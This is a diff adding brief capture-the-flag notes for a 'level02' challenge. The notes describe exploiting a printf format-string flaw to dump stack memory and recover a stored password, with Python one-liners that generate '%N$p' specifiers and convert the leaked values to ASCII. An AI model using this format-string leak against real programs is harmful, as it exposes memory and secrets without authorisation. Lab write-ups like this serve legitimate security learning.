@@ -1,0 +1,17 @@
+decompile ./level02
+
+The program read the password and store it in a buffer but then exit
+the goal is to use the printf to print all the memory until we get to the password
+and then translate the password (should be 4 bytes + 1 byte for '\0')
+the printf can only take 100 characters max so either print 1 adress at a time or by small batch
+
+python -c 'print " ".join(["%%%d$p" % i for i in range(1, 10)])'
+
+as a command to print a range
+
+locate 5 bytes with only printable chars followed by at least 1 bit = '\0'
+found something that might match at 22
+
+convert the bytes to their ascii value
+
+ python -c 'import struct; print "".join([struct.pack("<Q", x) for x in [the 5 raw value]])
